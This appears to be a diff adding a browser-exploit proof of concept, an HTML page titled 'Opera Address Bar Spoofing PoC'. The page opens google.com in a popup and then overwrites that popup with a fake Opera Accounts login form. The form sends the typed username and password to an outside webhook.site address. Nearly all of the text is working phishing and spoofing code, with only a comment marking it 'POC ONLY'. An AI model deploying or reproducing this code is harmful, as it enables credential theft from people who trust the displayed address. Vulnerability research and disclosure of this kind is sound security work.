@@ -1,1 +1,177 @@
-<input type="button" value="Click here" onclick="setTimeout(function(){window.open('https://www.apple.com/contact/');}, 123);setTimeout(function(){document.location='tel:+2123232';}, 723);">
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Opera Address Bar Spoofing PoC GOOGLE</title>
+
+<style>
+body{
+font-family:Arial;
+text-align:center;
+margin-top:80px;
+background:#f5f5f5;
+}
+
+button{
+padding:12px 18px;
+font-size:16px;
+margin:10px;
+cursor:pointer;
+}
+</style>
+
+<script>
+
+function startTest(){
+
+var win = window.open("https://google.com/account/authenticate.html");
+
+if(!win){
+alert("Popup blocked");
+return;
+}
+
+setTimeout(function(){
+
+try{
+
+win.document.open();
+
+win.document.write(`
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Webhook Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      background: white;
+      padding: 40px 30px;
+      width: 350px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .login-box h2 {
+      margin-bottom: 25px;
+      color: #333;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #e60023;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s;
+    }
+
+    .login-box button:hover {
+      background-color: #b3001a;
+    }
+
+    #status {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>Login (Opera Accounts)</h2>
+
+  <input id="username" placeholder="Username" type="text">
+  <input id="password" placeholder="Password" type="password">
+  <button onclick="send()">LOGIN & KIRIM</button>
+
+  <p id="status"></p>
+</div>
+
+<script>
+  const WEBHOOK_URL = "https://webhook.site/f917b4a4-9832-462b-a001-51ae68a71200";
+
+  function send() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!username || !password) {
+      alert("Username dan password wajib diisi!");
+      return;
+    }
+
+    const data = {
+      username: username,
+      password: password,   // ⚠️ POC ONLY
+      action: "login",
+      time: new Date().toISOString(),
+      page: window.location.href
+    };
+
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify(data)
+    });
+
+    document.getElementById("status").innerText = "DONT SUBMIT REAL";
+    
+    // Reset input setelah dikirim
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  }
+
+<\/script>
+
+</body>
+</html>
+`);
+
+win.document.close();
+
+}catch(e){
+console.log("Blocked:",e);
+}
+
+},3000);
+
+}
+
+</script>
+
+</head>
+
+<body>
+
+<h2>Opera Address Bar Spoofing PoC</h2>
+
+<p>Click the button below to start the test.</p>
+
+<button onclick="startTest()">Start Test</button>
+
+</body>
+</html>
